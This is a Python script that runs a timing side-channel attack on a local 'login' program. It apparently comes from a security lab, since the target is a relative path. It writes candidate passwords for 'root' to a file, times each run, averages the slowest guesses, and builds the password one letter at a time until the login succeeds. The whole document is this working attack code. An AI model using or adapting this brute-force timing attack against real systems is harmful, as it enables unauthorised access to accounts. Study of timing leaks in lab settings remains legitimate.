#!/usr/bin/python3
import os
import time

alphabet = [chr(x) for x in range(ord('a'), ord('z') + 1)] + [chr(x) for x in range(ord('A'), ord('Z') + 1)]

def getCodes():
    ret = []

    for char1 in alphabet:
        ret.append(char1)

    return ret

def testCode(code):
    file = open("test.txt", "w")
    file.write("root\n")
    file.write(code + "\n")
    file.close()
    timeStart = time.time_ns()
    status = os.system("../src/login < test.txt 1>/dev/null 2>/dev/null")
    timeEnd = time.time_ns()
    return status, timeEnd - timeStart

def testfunc2(tests):
    maxAvgTime = 0.0
    maxCode = ""

    for test in tests:
        elapsedlist = []
        code = test[1]
        for i in range(0, 100):
            _, elapsed = testCode(code)
            elapsedlist.append(elapsed)
        
        avgTime = sum(elapsedlist) / len(elapsedlist)
        if (maxAvgTime < avgTime):
            maxAvgTime = avgTime
            maxCode = code   
    return maxCode


def testfunc(codes, prefix):
    measuredTests=[]
    numtries = 0

    for code in codes:
        status, elapsed = testCode(prefix + code)
        if (status == 0):
            return True, prefix + code

        measuredTests.append((elapsed, prefix + code))
        numtries = numtries + 1

    # pick the ten longest tests and check average execution time
    measuredTestsByTime = sorted(measuredTests, key=lambda tup: tup[0], reverse = True)
    tenLongestTests = measuredTestsByTime[0:5]
    maxcode = testfunc2(tenLongestTests)
    return False, maxcode

def main():
    codes = getCodes()
    prefix = ""
    found = False

    while ((found == False) and (len(prefix) < 16)):
        found, pwdOrPrefix = testfunc(codes, prefix)
        if (found == True):
            print("Found password: " + pwdOrPrefix)
        else:
            prefix = pwdOrPrefix
            print("Password not found yet, most likely starts with: " + prefix)

    if (found == False):
        print("Didnt find password this time, try again :-)")

if __name__ == "__main__":
    main()
